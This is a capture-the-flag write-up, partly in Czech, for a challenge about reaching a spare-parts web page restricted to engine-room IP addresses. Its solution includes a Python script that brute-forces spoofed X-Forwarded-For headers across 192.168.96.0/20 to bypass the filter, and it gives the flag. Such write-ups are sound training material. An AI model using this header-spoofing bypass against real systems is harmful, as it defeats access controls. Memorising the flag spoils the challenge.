# Component replacement (3)

## Zadání

Ahoy, officer,

the ship had to lower its speed because of broken `fuel efficiency enhancer`. To order a correct spare part, the chief engineer needs to know exact identification code of the spare part. However, he cannot access the web page listing all the key components in use. Maybe the problem has to do with recently readdressing of the computers in the engine room - the old address plan for whole ship was based on range `192.168.96.0/20`. Your task is to find out the identification code of the broken component.

May you have fair winds and following seas!

The webpage with spare parts listing is available at <http://key-parts-list.cns-jv.tcc>.

## Nápovědy (Hints)

1. Use VPN to get access to the webpage.
2. Try to bypass the IP address filter.

## Řešení

Po zobrazení stránky odpoví server chybou

`You are attempting to access from the IP address 10.200.0.47, which is not assigned to engine room. Access denied.`

Jak napovídá hint č. 2 je tedy nutné podstrčit serveru adresu z rozsahu `192.168.96.0/20`. Tedy `192.168.96.1 - 192.168.111.254`.

K tomu použijeme hlavičku `X-Forwarded-For` a jednoduchým skriptem vyzkoušíme všechny IP adresy

```python
import requests

for i in range(96, 112):
    for j in range(0, 256):
        ip = "192.168." + str(i) + '.' + str(j)
        headers = {
            "X-Forwarded-For": ip
        }
        r = requests.get('http://key-parts-list.cns-jv.tcc/', headers=headers)

        print(str(ip) + ' : ' + r.text)

        if 'FLAG{' in r.text:
            exit()
```

U IP adresy 192.168.100.32 se vypíše hledaný FLAG.

## Flag

`FLAG{MN9o-V8Py-mSZV-JkRz}`
